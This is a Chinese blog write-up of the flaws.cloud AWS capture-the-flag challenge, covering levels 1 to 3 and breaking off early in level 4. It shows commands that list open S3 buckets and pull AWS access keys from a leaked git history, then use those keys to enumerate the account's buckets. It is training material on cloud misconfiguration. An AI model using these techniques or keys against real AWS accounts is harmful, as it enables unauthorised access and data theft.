    <link href="/2020/09/22/FLAWS-challenge/"/>
    <url>/2020/09/22/FLAWS-challenge/</url>
    
    <content type="html"><![CDATA[<p>【文章首发于《安全客》<a href="https://www.anquanke.com/post/id/201460%E3%80%91">https://www.anquanke.com/post/id/201460】</a></p><p><img src="https://p2.ssl.qhimg.com/t0152316050b2c9f8e9.png"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在学习AWS（Amazon Web Services）的相关知识，发现了一个很有趣的AWS CTF——<a href="http://flaws.cloud/">flaws</a>。对于想了解AWS相关安全知识的小伙伴，FLAWS是一个不错的学习平台。我们可以通过一系列挑战，了解掌握AWS常见的错误和漏洞。这个CTF平台上，并不需要我们关注SQLi、XSS、Buffer overflow等等这些为人熟知的漏洞，所需要关注的点集中在与AWS的特定问题上。</p><p>对于不了解AWS的小伙伴，可以查看<a href="https://aws.amazon.com/">AWS官网</a>查看相关文档，或者查看<a href="https://en.wikipedia.org/wiki/Amazon_Web_Services">AWS的维基百科</a>，了解相关基础知识。</p><p>在FLAWS的挑战网站首页<a href="http://flaws.cloud/">http://flaws.cloud</a> ，有这样一段话：</p><blockquote><p><strong>Scope</strong>: Everything is run out of a single AWS account, and all challenges are sub-domains of <a href="http://flaws.cloud/">flaws.cloud</a>.</p></blockquote><p>也就是说，这个平台的所有内容都运行在一个AWS账户中，并且所有的挑战都是<code>flaws.cloud</code>的子域。</p><p>FLAWS一共包括6个挑战，下面就开始我们的通关之旅吧 =）</p><h2 id="0x01-Level-1"><a href="#0x01-Level-1" class="headerlink" title="0x01 Level 1"></a>0x01 Level 1</h2><blockquote><p>This level is <em>buckets</em> of fun. See if you can find the first sub-domain.</p></blockquote><p>这里的提示中，可以打看到<code>buckets</code>这个关键词，对AWS有了解的小伙伴肯定知道，这里指的就<code>AWS S3 buckets</code>。由于S3存储桶能够托管静态网站，那么<code>flaws.cloud</code>很有可能就放在上面。</p><p>利用<code>nslookup</code>工具进行查询，可以看到IP地址为<code>52.218.218.194</code>：</p><p><img src="https://p3.ssl.qhimg.com/t0162d2fd9d5f2f196e.png"></p><p>利用<code>dig</code>工具进行反向查询，成功得到<code>flaws.cloud</code>的S3存储桶的地址<code>s3-website-us-west-2.amazonaws.com</code>：</p><p><img src="https://p3.ssl.qhimg.com/t014c903087a76e7908.png"></p><p><em>一个额外的小知识：对于每个托管在S3存储桶中的网站，都会被分配一个AWS的域名，而不需要你自己额外配置DNS。所以，<code>flaws.cloud</code>加上它的S3地址：<a href="http://flaws.cloud.s3-website-us-west-2.amazonaws.com/">http://flaws.cloud.s3-website-us-west-2.amazonaws.com/</a> ，也能访问到主页。</em></p><p>通过上述查询，我们知道<code>flaws.cloud</code>是一个在S3中的静态网站，地区位于<code>us-west-2</code>。如果使用一个自定义的域名（比如<code>flaws.cloud</code>）在S3中定义了一个静态站点，那它的<code>bucket name</code>则必须与这个自定义域名一致。对于S3存储桶上HTTP端点的URL遵循固定格式：<code>s3-&lt;region&gt;.amazonaws.com/&lt;bucketname&gt;</code>。基于这个准则，我们可以得出<code>flaws.cloud</code>的S3端点应该是<a href="http://s3-us-west-2.amazonaws.com/flaws.cloud">http://s3-us-west-2.amazonaws.com/flaws.cloud</a> 。</p><p>访问这个链接，返回一个XML，包含以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="tag">&lt;<span class="name">ListBucketResult</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://s3.amazonaws.com/doc/2006-03-01/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span>flaws.cloud<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Prefix</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Marker</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">MaxKeys</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">MaxKeys</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IsTruncated</span>&gt;</span>false<span class="tag">&lt;/<span class="name">IsTruncated</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>hint1.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-03-14T03:00:38.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;f32e6fbab70a118cf4e2dc03fd71c59d&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>2575<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>hint2.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-03-03T04:05:17.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;565f14ec1dce259789eb919ead471ab9&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>1707<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>hint3.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-03-03T04:05:11.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;ffe5dc34663f83aedaffa512bec04989&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>1101<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2018-07-10T16:47:16.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;ddd133aef0f381cf0440d5f09648791d&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>3082<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>logo.png<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2018-07-10T16:47:16.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;0623bdd28190d0583ef58379f94c2217&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>15979<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>robots.txt<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-02-27T01:59:28.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;9e6836f2de6d6e6691c78a1902bf9156&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>46<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>secret-dd02c7c.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-02-27T01:59:30.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;c5e83d744b4736664ac8375d4464ed4c&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>1051<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ListBucketResult</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们在页面中发现<code>secret-dd02c7c.html</code>在这个存储桶中：</p><p><img src="https://p2.ssl.qhimg.com/t01f12139851a3eeb64.png"></p><p>访问<a href="http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html">http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html</a> ，找到level 2的入口，成功通过level 1：</p><p><img src="https://p3.ssl.qhimg.com/t010bb26a6b132de2d2.png"></p><h2 id="0x02-Level-2"><a href="#0x02-Level-2" class="headerlink" title="0x02 Level 2"></a>0x02 Level 2</h2><blockquote><p>The next level is fairly similar, with a slight twist. You’re going to need your own AWS account for this.</p></blockquote><p>这里第二关与第一关类似，可以想到仍然与S3有关，同时考虑到需要我们拥有自己的AWS账号，则可以联系到应该与S3存储桶的跨权限访问有关。</p><p>关于注册AWS免费账号，这里不过多阐述，可以查看这篇文章——<a href="https://zhuanlan.zhihu.com/p/67478818">AWS入门 – 开通海外账户及巧用免费套餐</a>。由于我已经拥有自己的AWS账号，下面开始继续通关挑战。</p><p>首先通过账户的访问秘钥（AWSAccessKeyId、AWSSecretKey）配置AWS CLI：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~$ aws configure</span><br><span class="line">AWS Access Key ID :********************</span><br><span class="line">AWS Secret Access Key :********************:</span><br><span class="line">Default region name [ap-southeast-1]: us-west-2</span><br><span class="line">Default output format [None]:</span><br></pre></td></tr></table></figure><p>通过level 2 的入口的URL：<a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html</a> ，我们知道它的存储桶为<code>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code> 。这时尝试用自身账户配置好的AWS CLI 列出level 2 存储桶中包含的内容，发现<code>secret-e4443fc.html</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~$ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --region us-west-2 --recursive</span><br><span class="line"></span><br><span class="line">2017-02-27 10:02:15      80751 everyone.png</span><br><span class="line">2017-03-03 11:47:17       1433 hint1.html</span><br><span class="line">2017-02-27 10:04:39       1035 hint2.html</span><br><span class="line">2017-02-27 10:02:14       2786 index.html</span><br><span class="line">2017-02-27 10:02:14         26 robots.txt</span><br><span class="line">2017-02-27 10:02:15       1051 secret-e4443fc.html</span><br></pre></td></tr></table></figure><p>继续参照S3存储桶HTTP端点的URL规则<code>&lt;region&gt;.amazonaws.com/&lt;bucketname&gt;</code>（这里的<code>&lt;bucketname&gt;</code>对应level 2 的存储桶地址<code>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code>），访问这一秘密页面：<a href="http://s3-us-west-2.amazonaws.com/level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html">http://s3-us-west-2.amazonaws.com/level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html</a><br>成功通关level 2，找到level 3的入口。</p><p><img src="https://p4.ssl.qhimg.com/t01276baefad0e6c8da.png"></p><h2 id="0x03-Level-3"><a href="#0x03-Level-3" class="headerlink" title="0x03 Level 3"></a>0x03 Level 3</h2><blockquote><p>The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you’ll find something that will let you list what other buckets are.</p></blockquote><p>这一关依然与前面类似，从S3的思路进行考虑，需要寻找AWS的key。</p><p>尝试访问level 3 的存储桶地址<code>http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</code>，返回XML：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="tag">&lt;<span class="name">ListBucketResult</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://s3.amazonaws.com/doc/2006-03-01/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span></span><br><span class="line">level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</span><br><span class="line"><span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>用AWS CLI获取整个列表，发现<code>authenticated_users.png</code> 和一堆<code>.git</code> 目录。：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">~$ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --recursive</span><br><span class="line"></span><br><span class="line">2017-09-17 23:12:24         52 .git/COMMIT_EDITMSG</span><br><span class="line">2017-09-17 23:12:24         23 .git/HEAD</span><br><span class="line">2017-09-17 23:12:24        130 .git/config</span><br><span class="line">2017-09-17 23:12:24         73 .git/description</span><br><span class="line">2017-09-17 23:12:24        452 .git/hooks/applypatch-msg.sample</span><br><span class="line">2017-09-17 23:12:24        896 .git/hooks/commit-msg.sample</span><br><span class="line">2017-09-17 23:12:24        189 .git/hooks/post-update.sample</span><br><span class="line">2017-09-17 23:12:24        398 .git/hooks/pre-applypatch.sample</span><br><span class="line">2017-09-17 23:12:24       1704 .git/hooks/pre-commit.sample</span><br><span class="line">2017-09-17 23:12:24       4898 .git/hooks/pre-rebase.sample</span><br><span class="line">2017-09-17 23:12:24       1239 .git/hooks/prepare-commit-msg.sample</span><br><span class="line">2017-09-17 23:12:24       3611 .git/hooks/update.sample</span><br><span class="line">2017-09-17 23:12:24        600 .git/index</span><br><span class="line">2017-09-17 23:12:24        240 .git/info/exclude</span><br><span class="line">2017-09-17 23:12:24        359 .git/logs/HEAD</span><br><span class="line">2017-09-17 23:12:24        359 .git/logs/refs/heads/master</span><br><span class="line">2017-09-17 23:12:24        679 .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25</span><br><span class="line">2017-09-17 23:12:24        770 .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df</span><br><span class="line">2017-09-17 23:12:25        820 .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c</span><br><span class="line">2017-09-17 23:12:25        245 .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b</span><br><span class="line">2017-09-17 23:12:25     112013 .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c</span><br><span class="line">2017-09-17 23:12:25        560 .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c</span><br><span class="line">2017-09-17 23:12:25        191 .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526</span><br><span class="line">2017-09-17 23:12:25         42 .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526</span><br><span class="line">2017-09-17 23:12:25        904 .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2</span><br><span class="line">2017-09-17 23:12:25         98 .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2</span><br><span class="line">2017-09-17 23:12:25        279 .git/objects/f2/a144957997f15729d4491f251c3615d508b16a</span><br><span class="line">2017-09-17 23:12:25        125 .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61</span><br><span class="line">2017-09-17 23:12:25         41 .git/refs/heads/master</span><br><span class="line">2017-02-27 08:14:33     123637 authenticated_users.png</span><br><span class="line">2017-02-27 08:14:34       1552 hint1.html</span><br><span class="line">2017-02-27 08:14:34       1426 hint2.html</span><br><span class="line">2017-02-27 08:14:35       1247 hint3.html</span><br><span class="line">2017-02-27 08:14:33       1035 hint4.html</span><br><span class="line">2017-02-27 10:05:16       1703 index.html</span><br><span class="line">2017-02-27 08:14:33         26 robots.txt</span><br></pre></td></tr></table></figure><p>查看<code>authenticated_users.png</code> <a href="http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png">http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png</a> ，并没有获得有用的信息。</p><p><img src="https://p2.ssl.qhimg.com/t01043d50b99d265506.png"></p><p>将level 3 存储桶上的内容复制一份：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ aws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ~/testtest --recursive</span><br></pre></td></tr></table></figure><p>通过浏览<code>.git</code>内部的文件内容， 在<code>.git/COMMIT_EDITMSG</code>中发现<code>Oops, accidentally added something I shouldn&#39;t have</code>，看来上传了敏感的东西。</p><p>查看<code>git log</code>，发现敏感信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~\testtest$ git log</span><br><span class="line"></span><br><span class="line">commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -&gt; master)</span><br><span class="line">Author: 0xdabbad00 &lt;scott@summitroute.com&gt;</span><br><span class="line">Date:   Sun Sep 17 09:10:43 2017 -0600</span><br><span class="line"></span><br><span class="line">    Oops, accidentally added something I shouldn&#x27;t have</span><br><span class="line"></span><br><span class="line">commit f52ec03b227ea6094b04e43f475fb0126edb5a61</span><br><span class="line">Author: 0xdabbad00 &lt;scott@summitroute.com&gt;</span><br><span class="line">Date:   Sun Sep 17 09:10:07 2017 -0600</span><br><span class="line"></span><br><span class="line">    first commit</span><br></pre></td></tr></table></figure><p>可以看到，开发人员在提交<code>f52ec03b227ea609b04e43f475fb0126edb5a61</code>时有他不想要的东西，并在提交<code>b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526</code>时删除了它。</p><p>查看<code>f52ec03b227ea609b04e43f475fb0126edb5a61</code>这一提交：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">~\testtest$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61</span><br><span class="line"></span><br><span class="line">Note: checking out &#x27;f52ec03b227ea6094b04e43f475fb0126edb5a61&#x27;.</span><br><span class="line"></span><br><span class="line">You are in &#x27;detached HEAD&#x27; state. You can look around, make experimental</span><br><span class="line">changes and commit them, and you can discard any commits you make in this</span><br><span class="line">state without impacting any branches by performing another checkout.</span><br><span class="line"></span><br><span class="line">If you want to create a new branch to retain commits you create, you may</span><br><span class="line">do so (now or later) by using -b with the checkout command again. Example:</span><br><span class="line"></span><br><span class="line">  git checkout -b &lt;new-branch-name&gt;</span><br><span class="line"></span><br><span class="line">HEAD is now at f52ec03 first commit</span><br></pre></td></tr></table></figure><p>再次查看目录中包含的文件，发现<code>access_keys.txt</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/testtest$ ls</span><br><span class="line"></span><br><span class="line">access_keys.txt  authenticated_users.png  hint1.html  hint2.html  hint3.html </span><br></pre></td></tr></table></figure><p>查看<code>access_keys.txt</code>的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~/testtest$ cat access_keys.txt</span><br><span class="line"></span><br><span class="line">access_key AKIAJ366LIPB4IJKT7SA</span><br><span class="line">secret_access_key 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</span><br></pre></td></tr></table></figure><p>用获得的<code>access_keys</code>配置AWS CLI：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~/testtest$ aws configure --profile flaws</span><br><span class="line">AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA</span><br><span class="line">AWS Secret Access Key [None]: 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</span><br><span class="line">Default region name [None]: us-west-2</span><br><span class="line">Default output format [None]:</span><br></pre></td></tr></table></figure><p>用这个账户权限看看S3存储桶中有什么有意思的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~$ aws s3 ls --profile flaws</span><br><span class="line"></span><br><span class="line">2017-02-19 03:41:52 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud</span><br><span class="line">2017-05-30 00:34:53 config-bucket-975426262029</span><br><span class="line">2018-07-08 00:09:49 flaws-logs</span><br><span class="line">2017-02-19 03:40:54 flaws.cloud</span><br><span class="line">2017-02-24 13:15:42 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</span><br><span class="line">2017-02-27 02:29:03 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</span><br><span class="line">2017-02-27 02:49:31 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</span><br><span class="line">2017-02-27 03:49:03 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud</span><br><span class="line">2017-02-27 03:48:40 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</span><br><span class="line">2017-02-27 04:07:13 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud</span><br></pre></td></tr></table></figure><p>成功通关level 3，并找到level 4的入口。</p><h2 id="0x04-Level-1-3-小结"><a href="#0x04-Level-1-3-小结" class="headerlink" title="0x04 Level 1-3 小结"></a>0x04 Level 1-3 小结</h2><p>至此，涉及到S3存储桶的挑战（level 1-3）已经全部通关，这里进行一个小结：</p><p>在AWS中，可以在S3存桶中可以配置各种权限的功能，包括用来托管静态网站。如果使用了过于宽松的权限，比如将访问权限设置为<code>Everyone</code>，就有可能像访问Web服务器目录列表一样访问S3存储桶的列表，就可能造成信息泄露。hackone平台上的几个类似的漏洞报告，包括针对Shopify、Udemy等厂家的S3文件目录暴露，读写S3的权限等：<a href="https://hackerone.com/reports/163476">https://hackerone.com/reports/163476</a> ，<a href="https://hackerone.com/reports/57505">https://hackerone.com/reports/57505</a> ，<a href="https://hackerone.com/reports/111643">https://hackerone.com/reports/111643</a> ，<a href="https://hackerone.com/reports/131468">https://hackerone.com/reports/131468</a> 。</p><p>如果出现的了将访问权限错误的这是为<code>Any Authenticated AWS User</code>，即任何身份认证的AWS用户，而错误的认为这只是对自己的其他用户开放，依然会造成一个跨权限的访问。这里给出hackerone平台上针对Shopify的一个漏洞报告进行参考：<a href="https://hackerone.com/reports/98819">https://hackerone.com/reports/98819</a> 。</p><p>AWS秘钥泄露时常出现，这里提供一篇关于Instagram的百万美元的漏洞文章进行学习——Instagram’s Million Dollar Bug：<a href="http://www.exfiltrated.com/research-Instagram-RCE.php">http://www.exfiltrated.com/research-Instagram-RCE.php</a> 。这篇文章中，安全研究员发现了一系列缺陷，包括一个S3桶，其中包含.tar.gz存档的各种修订文件，而其中一个档案包含了<code>AWS credentials</code>，使得研究人员访问所Instagram所有的S3存储桶。</p><h2 id="0x05-Level-4"><a href="#0x05-Level-4" class="headerlink" title="0x05 Level 4"></a>0x05 Level 4</h2><blockquote><p>For the next level, you need to get access to the web page running on an EC2 at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/">4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</a></p><p>It’ll be useful to know that a snapshot was made of that 